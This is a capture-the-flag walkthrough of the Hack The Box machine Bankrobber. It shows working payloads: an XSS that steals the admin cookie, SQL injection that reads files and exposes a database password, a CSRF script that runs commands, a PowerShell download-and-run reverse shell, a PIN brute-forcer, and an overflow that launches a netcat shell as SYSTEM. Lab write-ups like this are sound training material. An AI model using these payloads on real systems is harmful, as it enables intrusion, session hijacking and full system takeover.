# Bankrobber

This is the write-up for the box Bankrobber that got retired at the 7th March 2020.
My IP address was 10.10.14.14 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.154    bankrobber.htb
```

## Enumeration

Starting with a Nmap scan:

```
nmap -sC -sV -o nmap/bankrobber.nmap 10.10.10.154
```

```
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
|_http-title: E-coin
443/tcp  open  ssl/http     Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
|_http-title: E-coin
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3306/tcp open  mysql        MariaDB (unauthorized)
Service Info: Host: BANKROBBER; OS: Windows; CPE: cpe:/o:microsoft:windows
```

The web services on port 80 and 443 run the same versions of Apache and have the same content.

## Checking HTTP / HTTPS (Port 80 / 443)

The website is a custom-developed page that looks like a crypto currency exchange platform and it has a _Register_ and _Login_ feature:

![Bankrobber Homepage](https://kyuu-ji.github.io/htb-write-up/bankrobber/bankrobber_web-1.png)

After trying to log in, the website forwards to _index.php_ which is the homepage, but it is useful to know that it runs PHP.

Lets search for hidden directories and PHP files with **Gobuster**:
```
gobuster -u http://10.10.10.154 dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
```

It finds the following directories:
- _/user_
  ```
  You're not authorized to view this page
  ```
- _/admin_
  ```
  You're not authorized to view this page
  ```
- _/phpmyadmin_ (403 Forbidden)
  ```
  New XAMPP security concept:
  Access to the requested object is only available from the local network.
  This setting can be configured in the file "httpd-xampp.conf".
  ```

It finds the following PHP files:
- _/login.php_
  - Forwards to _index.php_
- _/register.php_
  - Blank page
- _/link.php_
  - Blank page

After registering, it forwards to _/index.php?msg=User%20created_.
After login, it forwards to _/user_ and there is a feature to transfer E-coin:

![Transfer E-Coin](https://kyuu-ji.github.io/htb-write-up/bankrobber/bankrobber_web-2.png)

When sending any amount to any ID, it shows a message, that an admin will review it:
```
Transfer on hold. An admin will review it within a minute.
After that he will decide whether the transaction will be dropped or not.
```

Whenever a person has to review something, it looks like it could be possible to exploit a **Cross-Site-Scripting vulnerability**.
Lets test this by sending a simple XSS payload in the comment field and wait if a connections comes back:
```
<img src=http://10.10.14.14/test.jpg />
```

After a while, the listener on my IP and port 80 got a response from the admin:
```
Ncat: Connection from 10.10.10.154:50158.
GET /test.jpg HTTP/1.1
Referer: http://localhost/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
(...)
```

### Cross-Site-Scripting (XSS)

The goal of the XSS vulnerability is to get the cookie of the admin to hijack the session and get into the admin portal.
Therefore we need to know how the cookie on the page is stored by looking at our own current cookie:
```
Cookie: id=3; username=dGVzdHVzZXI%3D; password=UGFzczEyMw%3D%3D
```

The username and password are stored encoded with _Base64_:
```
echo UGFzczEyMw== | base64 -d

Pass123
```
```
echo dGVzdHVzZXI= | base64 -d

testuser
```

On [PayloadsAllTheThings are many XSS payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection) that can be tried out.
Lets test different payloads until it sends the cookie:
```
POST /user/transfer.php
(...)
fromId=3&toId=1&amount=1234&comment=<img src=x onerror=this.src="http://10.10.14.14/?c=" document.cookie />
```

After URL-encoding and sending the request, it takes a while and then sends the cookie of the admin to our listener:
```
Cookie: username=YWRtaW4%3D; password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D; id=1
```

Base64-decoded username and password:
```
echo YWRtaW4= | base64 -d

admin
```
```
echo SG9wZWxlc3Nyb21hbnRpYw== | base64 -d

Hopelessromantic
```

With these credentials it is possible to log in and the _admin_ has more features available.

The admin panel has features to _search users_ and a _backdoorchecker_:

![Admin panel](https://kyuu-ji.github.io/htb-write-up/bankrobber/bankrobber_web-3.png)

There is also _notes.txt_ with the following content:
```
- Move all files from the default Xampp folder: TODO
- Encode comments for every IP address except localhost: Done
- Take a break..
```

The _backdoorchecker_ filename is _backdoorchecker.php_ and when running `dir` on it as intended, it tells that it is only allowed from localhost:
```
It's only allowed to access this function from localhost (::1).
This is due to the recent hack attempts on our server.
```

Trying another command, tells that only the `dir` command is allowed:
```
It's only allowed to use the dir command
```

When appending a single quote on the _user search_ feature, it says that there is an error with the the **SQL** syntax, so there is a **SQL Injection vulnerability** on this.

### SQL Injection

Lets copy the request with **Burpsuite** to a file and try a **Union SQL Injection** with **SQLmap**:
```
sqlmap -r search_user.req --dbms mysql --technique=U --batch --dump
```

It dumps the databases and one of them has usernames and passwords:
```
+----+------------------+----------+
| id | password         | username |
+----+------------------+----------+
| 1  | Hopelessromantic | admin    |
| 2  | gio              | gio      |
| 3  | Pass123          | testuser |
+----+------------------+----------+
```

The SQL injection query looks like this and displays anything at position 1 and 2:
```
POST /admin/search.php
(...)
term=2' union select 1,2,3-- -
```

Commands with **MySQL** work and can display the name of the user for example with `user()`:
```
term=2' union select 1,user(),3-- -
```
```
root@localhost
```

With these commands, it is possible to find out more information and read files from the system.

Getting the directory path of the database:
```
term=2' union select 1,@@datadir,3-- -
```
```
C:\xampp\mysql\data\
```

Getting source code of _backdoorchecker.php_:
```
term=2' union select 1,LOAD_FILE('c:/xampp/htdocs/admin/backdoorchecker.php'),3-- -
```

Interesting findings in the source code:
- It includes another PHP file called _link.php_

Getting source code of _link.php_:
```
term=2' union select 1,LOAD_FILE('c:/xampp/htdocs/link.php'),3-- -
```
```
$user = 'root';
$pass = 'Welkom1!';
$dsn = "mysql:host=127.0.0.1;dbname=bankrobber;";
(...)
```

- It does three checks to block command execution attempts
  - Block _"$"_ and _"&"_
  - Input has to contain `dir`
  - Remote address has to be _::1_ (localhost)

As the remote address has to be _localhost_, the **XSS vulnerability** from before can be used to call _backdoorchecker.php_ itself.

### Cross-Site-Request-Forgery (CSRF)

By using the **XSS vulnerability** to execute JavaScript files from our box, it becomes a **CSRF vulnerability**.
Now we create a payload _(bankrobber_payload.js)_ to call _backdoorchecker.php_ via POST request and it will execute itself from _localhost_ and all restrictions are bypassed:
```js
var xhr = new XMLHttpRequest();
var url = "http://localhost/admin/backdoorchecker.php";
var params = "cmd=dir | ping -n 1 10.10.14.14";

xhr.open("POST", url);
xhr.setRequestHeader('Content-Type', 'Application/x-www-form-urlencoded');
xhr.withCredentials = true;
xhr.send(params);
```

This payload is hosted on our local client and with the XSS vulnerability from before, it can be called to execute _backdoorchecker.php_ with the parameter to `ping` our client:
```
POST /user/transfer.php
(...)
fromId=3&toId=1&amount=1&comment=<script src=http://10.10.14.14/bankrobber_payload.js></script>
```

After a while the request is accepted and the `tcpdump` gets ICMP responses back from the box and command execution is proofed.

Lets start a reverse shell by changing the `ping` command to _Invoke-PowerShellTcp.ps1_ from the **Nishang scripts** to the box:
```
(...)
var params = "cmd=dir | powershell -exec bypass -f \\\\10.10.14.14\\www\\nishang-shell.ps1";
(...)
```

After sending the request, it will execute the PowerShell command to download and execute _nishang-shell.ps1_ and the listener on my IP and port 9001 starts a reverse shell session as the user _cortin_.

## Privilege Escalation

To get any attack surface on the box, it is recommended to run any **Windows Enumeration Script**.

Mounting an SMB share to the box for comfortable transferring:
```
net use X: \\10.10.14.14\www
```
```
./winPEAS.exe
```

Observations:
- Executable _C:\bankv2.exe_, but no read access
- Port 910 open, but it can't be accessed

```
netstat -an

TCP      0.0.0.0:910      0.0.0.0:0      LISTENING
```

Lets forward port 910 to our local client with [Chisel](https://github.com/jpillora/chisel):
```
./chisel_linux_amd64 server --port 9002 --reverse
```

Executing _chisel.exe_ on the box:
```
./chisel.exe client 10.10.14.14:9002 R:910:127.0.0.1:910
```

Now our client also listens on port 910 and can be scanned with **Nmap**:
```
nmap -p 910 -sC -sV -n 127.0.0.1
```
```
PORT    STATE SERVICE VERSION                                                           
910/tcp open  kink?                                                                     
| fingerprint-strings:                                                                  
|   GenericLines, GetRequest, HTTPOptions:                                              
|     --------------------------------------------------------------      
|     Internet E-Coin Transfer System                                                   
|     International Bank of Sun church                                                  
|     v0.1 by Gio & Cneeliz                                                             
|     --------------------------------------------------------------      
|     Please enter your super secret 4 digit PIN code to login:           
|     Access denied, disconnecting client....
```

This is probably the application behind _bankv2.exe_.
Connecting to it with **netcat**:
```
nc localhost 910
```
```
--------------------------------------------------------------
Internet E-Coin Transfer System
International Bank of Sun church
                                       v0.1 by Gio & Cneeliz
--------------------------------------------------------------
Please enter your super secret 4 digit PIN code to login:
[$] 1234
[!] Access denied, disconnecting client....
```

It asks for a 4 digit PIN and if it is wrong, closes the connection.
As there are only 10000 combinations for 4-digit PINs, it should be fast to Brute-Force it with a Python script:
```python
from pwn import *
for i in range(0,9999):
    pin = str(i)
    code = pin.zfill(4)
    r = remote("localhost", 910)
    r.recvuntil("[$] ")
    r.sendline(code)
    response = r.recvline()
    r.close()
    if b:"Access denied" not in response:
        print(code)
        break
```

It stops at the PIN number _0021_ and asks for the amount of e-coins to transfer and executes _C:\Users\admin\Documents\transfer.exe_:
```
Please enter your super secret 4 digit PIN code to login:
[$] 0021
[$] PIN is correct, access granted!
--------------------------------------------------------------
Please enter the amount of e-coins you would like to transfer:
[$] 1
[$] Transfering $1 using our e-coin transfer application.
[$] Executing e-coin transfer tool: C:\Users\admin\Documents\transfer.exe

[$] Transaction in progress, you can safely disconnect...
```

We send a pattern with 100 characters to see, if there is some kind of overflow:
```
/usr/bin/msf-pattern_create -l 100
```
```
Please enter the amount of e-coins you would like to transfer:
[$] Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
[$] Transfering $Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A using our e-coin transfer application.
[$] Executing e-coin transfer tool: 0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```

Offset of the string:
```
/usr/bin/msf-pattern_offset -l 100 -q 0Ab1
```
```
Exact match at offset 32
```

The program overwrites on byte 32, which means another program can be uploaded on the box and executed instead of _transfer.exe_.
I will upload [Netcat for Windows](https://eternallybored.org/misc/netcat/) and put it in _C:\Users\Corint\n.exe_.

Appending 32 _A's_ and then the command to execute:
```
Please enter the amount of e-coins you would like to transfer:
[$] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC:\Users\Cortin\n.exe 10.10.14.14 9003 -e cmd
[$] Transfering $AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC:\Users\Cortin\n.exe 10.10.14.14 9003 -e cmd using our e-coin transfer application.
[$] Executing e-coin transfer tool: C:\Users\Cortin\n.exe 10.10.14.14 9003 -e cmd
```

In the third line, it shows that it executes _"C:\Users\Cortin\n.exe 10.10.14.14 9003 -e cmd"_ and the listener on my IP and port 9003 starts a reverse shell connection as _NT Authority\SYSTEM_!
